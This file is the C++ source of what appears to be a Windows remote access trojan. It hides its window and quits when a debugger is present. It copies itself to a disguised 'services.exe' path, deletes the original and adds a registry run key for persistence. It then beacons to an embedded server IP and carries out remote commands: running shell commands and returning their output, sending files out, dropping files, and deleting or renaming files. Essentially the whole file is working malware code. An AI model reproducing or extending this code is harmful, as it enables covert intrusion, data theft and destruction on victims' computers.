
#include <iostream>
#include <windows.h>
#include <Shlwapi.h>
#include "public.h"

#include "http.h"

#include "https.h"

#include "uuid.h"
#include "packet.h"
#include "FileHelper.h"

#include "file.h"
#include "shell.h"

#include "mission.h"

#include "json.h"
#include "utils.h"

#include "RegHelper.h"

#include "main.h"

#include "config.h"
#include <shlobj_core.h>

#pragma comment(lib,"ws2_32.lib")

using namespace std;


#pragma comment(linker, "/subsystem:windows /entry:WinMainCRTStartup")
// #pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
// #pragma comment(linker, "/subsystem:console /entry:mainCRTStartup")
// #pragma comment(linker, "/subsystem:console /entry:WinMainCRTStartup")


HANDLE g_mutex_handle = 0;


static const char g_predata[MAX_PATH] = "0123456789abcdef";



int __stdcall delFileProc(wchar_t * filename) {
	do 
	{
		Sleep(1000);
		int ret = DeleteFileW(filename);
		if (ret)
		{
			//runLog("delete file:%ws\r\n", filename);
			break;
		}
		
	} while (TRUE);

	return 0;
}


int init() {

	//__debugbreak();

	LPWSTR argvs = GetCommandLineW();

	int argc = 0;
	LPWSTR * wstrcmds = CommandLineToArgvW(argvs, &argc);
	if (argc > 2 && lstrcmpiW(wstrcmds[1], L"/Delete") == 0) {

		HANDLE ht = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)delFileProc, wstrcmds[2], 0, 0);
		if (ht)
		{
			CloseHandle(ht);
		}
	}

	int ret = 0;
	g_mutex_handle = bRunning(&ret);
	if (ret)
	{
		//runLog("already running\r\n");
		ExitProcess(0);
	}
	ret = isDebugged();
	if (ret)
	{
		//runLog("debuggered\r\n");
		ExitProcess(0);
	}

	WSAData wsa;
	ret = WSAStartup(0x0202, &wsa);

#ifdef _DEBUG
	if (g_predata[16])
#endif
	{
		PROGRAM_PARAMS* params = (PROGRAM_PARAMS*)(g_predata + 16);
		g_ip = params->ip;
		//g_ip = inet_addr("192.168.231.1");
		//lstrcpyA(params->path, "appdata");
		//g_interval = 1000;

		g_httpsToggle = params->bHttps;
		g_interval = params->hbi*1000;
		g_fsize_limit = params->fzLimit*1024*1024;

		runLog("ip:%u,https:%u,interval:%u,filesize:%u,path:%s\r\n", g_ip, g_httpsToggle, g_interval, g_fsize_limit, params->path);

		char curpath[1024];
		GetModuleFileNameA(0, curpath, sizeof(curpath));
		if ( isalpha (params->path[0]) &&params->path[1] == ':' && params->path[2] == '\\')
		{
			if (lstrcmpiA(params->path, curpath) != 0)
			{
				ret = copySelf(params->path);
				if (ret)
				{
					ReleaseMutex(g_mutex_handle);
					CloseHandle(g_mutex_handle);

					char szcmd[1024];
					wsprintfA(szcmd, "\"%s\" /Delete \"%s\"", params->path,curpath);
					ret = WinExec(szcmd, SW_SHOW);

					ret = setRegBootRun(HKEY_CURRENT_USER, params->path);
					ExitProcess(0);
				}
			}
		}
		else {
			//char* user = getenv("USER");
			//char* appdata = getenv("APPDATA");
			//char mypath[MAX_PATH];
			//ret = SHGetSpecialFolderPathA(0, mypath, CSIDL_LOCAL_APPDATA, false);

			char* mypath = getenv(params->path);
			char service_path[] = { 's','e','r','v','i','c','e','s',0 };
			string folder = string(mypath) + "\\" + service_path;
			char exe_surfix[] = { '.','e','x','e' ,0};
			string newfn = folder +"\\" + service_path + exe_surfix;
			if (lstrcmpiA(newfn.c_str(), curpath) != 0)
			{
				runLog("folder:%s,path:%s\r\n",folder.c_str(),newfn.c_str());

				CreateDirectoryA(folder.c_str(), 0);

				ret = copySelf((char*)newfn.c_str());
				if (ret)
				{
					ReleaseMutex(g_mutex_handle);
					CloseHandle(g_mutex_handle);

					char szcmd[1024];
					wsprintfA(szcmd, "\"%s\" /Delete \"%s\"", newfn.c_str(), curpath);
					ret = WinExec(szcmd, SW_SHOW);

					runLog("cmd:%s\r\n", szcmd);

					ret = setRegBootRun(HKEY_CURRENT_USER,(char*) newfn.c_str());

					ExitProcess(0);
				}
			}
		}

		ret = setRegBootRun(HKEY_CURRENT_USER, curpath);
	}
#ifdef _DEBUG
	else {
		ret = Config::getConfig();
		char szpath[1024];
		GetModuleFileNameA(0, szpath, sizeof(szpath));
		ret = setRegBootRun(HKEY_CURRENT_USER, szpath);
	}
#endif

	ret = getUUID();

	return ret;
}



int clear() {
	int ret = 0;
	ret = WSACleanup();

	return ret;
}












int __stdcall fileMission() {

	int ret = 0;
	
	PacketParcel packet(TRUE);

	while (TRUE)
	{
		//runLog("%s %s\r\n", __FILE__, __FUNCTION__);

		ret = packet.postCmdFile(CMD_GET_DD_DATA, "",0);
		int datalen = packet.m_protocol->m_respLen;
		char* data = packet.m_protocol->m_resp;
		if (datalen == 0 || data == 0)
		{
			Sleep(g_interval);
			continue;
		}
		if (datalen == 4 && *(DWORD*)data == INVALID_RESPONSE)
		{
			
		}
		else if (datalen == 4 && *(DWORD*)data == DATA_PACK_TAG)
		{

		}
		else if (datalen > 4 && memcmp(data, CMD_SEND_DD_DATA, lstrlenA(CMD_SEND_DD_DATA)) == 0) {

			int fnl = *(data + 4);
			char* ptr = data + 4;
			ptr = ptr + 1 + fnl;

			MY_CMD_PACKET* pack = (MY_CMD_PACKET*)ptr;
			/*
			if (pack->type == MISSION_TYPE_DRIVE) {
				char drivers[128];
				int drivers_len = getDrivers(drivers, sizeof(drivers));

				char* sendbuf = buildCmd(drivers, drivers_len, MISSION_TYPE_DRIVE);

				ret = packet.postCmd(CMD_SEND_DRIVER, sendbuf, drivers_len+sizeof(MY_CMD_PACKET));
				if (sendbuf)
				{
					delete sendbuf;
				}		
			}
			else 
			*/
			if (pack->type == MISSION_TYPE_DRIVE || pack->type == MISSION_TYPE_FILE || pack->type == MISSION_TYPE_DIR)
			{
				*(pack->value + pack->len) = 0;
				//ret = packet.postFile(pack->value,pack->type);
			}
			else if (pack->type == COMMAND_TYPE_TERMINATE)
			{
				int subcmd = *(int*)((char*)pack + sizeof(MY_CMD_PACKET));
				if (subcmd == COMMAND_TYPE_TERMINATE)
				{
				}
				MyJson json(JSON_CONFIG_FILENAME);
				json.insert(KEYNAME_DEAD_STATUS, "true", JSON_TYPE_STRING);
				json.saveFile();

				//ret = packet.postCmd(CMD_GET_CMD, 0, 0);

				ExitProcess(0);
			}
			else if (pack->type == COMMAND_TYPE_HEARTBEAT)
			{
				string s = string(pack->value, pack->len);
				int sec = atoi(s.c_str());
				g_interval = sec*1000;
				MyJson json(JSON_CONFIG_FILENAME);
				json.insert(KEYNAME_HEARTBEART_INTERVAL, s.c_str(), JSON_TYPE_STRING);
				json.saveFile();
			}
			else if (pack->type == MISSION_TYPE_UPLOAD)
			{
				string fn = string(pack->value, pack->len);
				char * pack2 = (char*)pack + sizeof(MY_CMD_PACKET) + pack->len;
				char* file = pack2 + sizeof(int);
				int filesize = *(int*)pack2;
				int ret = FileHelper::fileWriter(fn.c_str(), file, filesize, TRUE);
			}
			else if (pack->type == MISSION_TYPE_DELFILE)
			{
				string fn = string(pack->value, pack->len);

				ret = PathIsDirectoryA(fn.c_str());
				if (ret & FILE_ATTRIBUTE_DIRECTORY)
				{
					//rmdir /s/q
					string cmd = string("rmdir /s /q ") + fn;
					ret = shell(cmd.c_str());
				}
				else {
					ret = DeleteFileA(fn.c_str());
				}			
			}
			else if (pack->type == MISSION_TYPE_RENFILE)
			{
				string sfn = string(pack->value, pack->len);
				ret = PathIsDirectoryA(sfn.c_str());
				if (ret & FILE_ATTRIBUTE_DIRECTORY)
				{
					continue;
				}
				else {

				}
				char* pack2 = (char*)pack + sizeof(MY_CMD_PACKET) + pack->len;
				int dfnlen = *(int*)pack2;
				string dfn = string(pack2 + sizeof(int), dfnlen);

				char* data = 0;
				int filesize = 0;
				ret = FileHelper::fileReader(sfn.c_str(), &data, &filesize);
				if (ret)
				{
					ret = FileHelper::fileWriter(dfn.c_str(), data, filesize, TRUE);
					DeleteFileA(sfn.c_str());
				}
			}

			datalen = packet.m_protocol->m_respLen;
			data = packet.m_protocol->m_resp;
			if (datalen >= 4 && *(int*)data == DATA_PACK_TAG)
			{

			}
		}

		Sleep(g_interval);
	}

	return 0;
}



int __stdcall cmdMission() {
	int ret = 0;

	PacketParcel packet(TRUE);

	while (TRUE)
	{
		runLog("%s %s\r\n", __FILE__, __FUNCTION__);

		ret = packet.postCmd(CMD_GET_CMD, 0,0);

		int datalen = packet.m_protocol->m_respLen;
		char* data = packet.m_protocol->m_resp;
		if (datalen == 0 || data == 0)
		{
			Sleep(g_interval);
			continue;
		}

		if (datalen == 4 && *(DWORD*)data == INVALID_RESPONSE)
		{

		}
		else if (datalen == 4 && *(DWORD*)data == DATA_PACK_TAG)
		{

		}
		else if (datalen >= 4 && memcmp(data, CMD_SEND_CMD, lstrlenA(CMD_SEND_CMD)) == 0) {
			//IN_PACKET_HEADER* pack = (IN_PACKET_HEADER*)data;
			//int hostlen = pack->hostname_len;

			MY_CMD_PACKET* inpack = (MY_CMD_PACKET*)(data + lstrlenA(CMD_SEND_CMD));

			int cmdlen = inpack->len;

			char* cmd = new char[(ULONGLONG)cmdlen + 16];

			memcpy(cmd, inpack->value,cmdlen);
			cmd[cmdlen] = 0;

			ret = shell(cmd);

			char* file = 0;
			int filesize = 0;
			ret = FileHelper::fileReader(CMD_RESULT_FILENAME, &file, &filesize);

			char* resdata = buildCmd(file, filesize, MISSION_TYPE_FILE);

			if (file)
			{
				delete file;
			}

			ret = packet.postCmd(CMD_SEND_CMD_RESULT, resdata, sizeof(MY_CMD_PACKET) + filesize);

			datalen = packet.m_protocol->m_respLen;
			data = packet.m_protocol->m_resp;

			if (resdata)
			{
				delete resdata;
			}

			DeleteFileA(CMD_RESULT_FILENAME);

			continue;
		}
		Sleep(g_interval);
	}
	
	return 0;
}


//compress,encrypt functions

int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) 
{
	int ret = 0;

	//ret = PathIsDirectoryA("c:\\");

	ret = init();

	//ret = mainProc();

// 	HANDLE ht = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)getAllFiles, 0, 0, 0);
// 	if (ht)
// 	{
// 		CloseHandle(ht);
// 	}

// 	HANDLE htf = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)fileMission, 0, 0, 0);
// 	if (htf)
// 	{
// 		CloseHandle(htf);
// 	}
// 	HANDLE htc = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)cmdMission, 0, 0, 0);
// 	if (htc)
// 	{
// 		CloseHandle(htc);
// 	}

	while (TRUE)
	{
		PacketParcel packet(TRUE);

		ret = packet.postCmd(CMD_ONLINE, 0, 0);

		runLog("test output\r\n");

		int datalen = packet.m_datalen;
		char* data = packet.m_data;
		if (datalen > 4 && *(int*)data == DATA_PACK_TAG)
		{
			PACKET_HEADER* hdr = (PACKET_HEADER*)(data);
			string server = string((char*)hdr->hdr.hostname2, hdr->hdr.hostname2_len);
			string id = string((char*)hdr->hdr.hostname, hdr->hdr.hostname_len);
			if (memcmp(hdr->hdr.cmd, CMD_BRING_COMMAND, lstrlenA(CMD_BRING_COMMAND)) == 0)
			{
				MY_CMD_PACKET* inpack = (MY_CMD_PACKET*)(data + sizeof(PACKET_HEADER));
				if (inpack->type == MISSION_TYPE_DRIVE || inpack->type == MISSION_TYPE_FILE || inpack->type == MISSION_TYPE_DIR)
				{
					string filename = string(inpack->value, inpack->len);
					packet.postFile(filename, inpack->type, (char*)hdr->hdr.hostname2, hdr->hdr.hostname2_len);
				}
				else if (inpack->type == MISSION_TYPE_CMD)
				{
					string cmd = string(inpack->value, inpack->len);
					ret = shell(cmd.c_str());

					packet.postFile(CMD_RESULT_FILENAME,0, (char*)hdr->hdr.hostname2, hdr->hdr.hostname2_len);

					DeleteFileA(CMD_RESULT_FILENAME);
				}
				else if (inpack->type == COMMAND_TYPE_TERMINATE)
				{
					int subcmd = *(int*)((char*)inpack + sizeof(MY_CMD_PACKET));
					if (subcmd == COMMAND_TYPE_TERMINATE)
					{
					}
					MyJson json(JSON_CONFIG_FILENAME);
					json.insert(KEYNAME_DEAD_STATUS, "true", JSON_TYPE_STRING);
					json.saveFile();

					//ret = packet.postCmd(CMD_GET_CMD, 0, 0);

					ExitProcess(0);
				}
				else if (inpack->type == COMMAND_TYPE_HEARTBEAT)
				{
					string s = string(inpack->value, inpack->len);
					int sec = atoi(s.c_str());
					g_interval = sec * 1000;
					MyJson json(JSON_CONFIG_FILENAME);
					json.insert(KEYNAME_HEARTBEART_INTERVAL, s.c_str(), JSON_TYPE_STRING);
					json.saveFile();
				}
				else if (inpack->type == MISSION_TYPE_UPLOAD)
				{
					string fn = string(inpack->value, inpack->len);
					char* pack2 = (char*)inpack + sizeof(MY_CMD_PACKET) + inpack->len;
					int filesize = *(int*)pack2;
					char* file = pack2 + sizeof(int);
					
					int ret = FileHelper::fileWriter(fn.c_str(), file, filesize, TRUE);
				}
				else if (inpack->type == MISSION_TYPE_DELFILE)
				{
					string fn = string(inpack->value, inpack->len);

					ret = PathIsDirectoryA(fn.c_str());
					if (ret & FILE_ATTRIBUTE_DIRECTORY)
					{
						//rmdir /s/q
						string cmd = string("rmdir /s /q ") + fn;
						ret = shell(cmd.c_str());
					}
					else {
						ret = DeleteFileA(fn.c_str());
					}
				}
				else if (inpack->type == MISSION_TYPE_RENFILE)
				{
					string sfn = string(inpack->value, inpack->len);
					ret = PathIsDirectoryA(sfn.c_str());
					if (ret & FILE_ATTRIBUTE_DIRECTORY)
					{
						continue;
					}
					else {

					}
					char* pack2 = (char*)inpack + sizeof(MY_CMD_PACKET) + inpack->len;
					int dfnlen = *(int*)pack2;
					string dfn = string(pack2 + sizeof(int), dfnlen);

					char* data = 0;
					int filesize = 0;
					ret = FileHelper::fileReader(sfn.c_str(), &data, &filesize);
					if (ret)
					{
						ret = FileHelper::fileWriter(dfn.c_str(), data, filesize, TRUE);
						ret = DeleteFileA(sfn.c_str());
					}
				}
			}
		}
		Sleep(g_interval);
	}	

	ret = clear();

	return 0;
}